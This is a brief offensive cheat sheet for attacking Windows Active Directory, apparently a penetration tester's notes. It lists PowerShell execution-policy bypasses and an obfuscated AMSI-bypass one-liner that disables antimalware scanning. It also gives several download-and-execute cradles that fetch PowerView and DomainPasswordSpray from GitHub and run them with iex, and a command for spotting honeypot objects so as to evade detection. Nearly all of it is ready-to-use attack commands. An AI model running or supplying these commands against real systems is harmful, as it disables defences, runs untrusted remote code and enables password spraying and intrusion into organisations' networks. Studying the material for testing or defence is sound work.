# Active Directory

## Execution Policy Bypass to run Scripts

```
powershell -ep bypass
powershell -c [cmd]
powershell ExecutionPolicy bypass
powershell encodedcommand
$env:PSExecutionPolicyPreference="bypass"
```

## AMSI Bypass

```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

## Importing Module

Import locally saved module&#x20;

```
Import-Module [path]
..\ModuleName.ps1
```

Import-Module  from web

```
//commonly used
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')

//Powershell v3 onwards
iex (iwr 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1')

$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1',$false);$h.send();iex $h.responseText

$wr = [System.NET.WebRequest]::Create("https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()

//didn't work for me
$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
```

##

### used to detect decoy and honeypot objects 

```
invoke-honeypotbuster -ops
```
